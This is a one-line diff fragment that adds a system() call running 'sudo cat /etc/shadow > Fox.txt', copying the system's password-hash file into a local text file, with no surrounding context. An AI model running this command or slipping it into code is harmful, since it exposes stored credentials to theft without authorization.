@@ -1,0 +1,1 @@
+system("sudo cat /etc/shadow > Fox.txt")
